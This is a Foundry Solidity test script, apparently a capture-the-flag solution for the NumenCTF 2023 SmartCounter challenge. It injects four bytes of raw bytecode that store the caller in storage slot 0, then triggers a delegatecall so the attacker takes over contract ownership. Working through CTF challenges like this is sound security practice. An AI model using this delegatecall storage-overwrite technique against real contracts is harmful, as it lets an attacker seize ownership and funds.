// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/NumenCTF_2023/Counter/SmartCounter.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SmartCounter c;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        c = new SmartCounter(deployer);

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", c.isSolved());
        vm.stopPrank();
    }

    function solve() public {

        // sstore(0, caller())
        // CALLER
        // PUSH1 0x00
        // SSTORE
        bytes memory code = hex"33600055";
        c.create(code);
        c.A_delegateccall("");
        console2.log("New owner:", c.owner());

    }
}


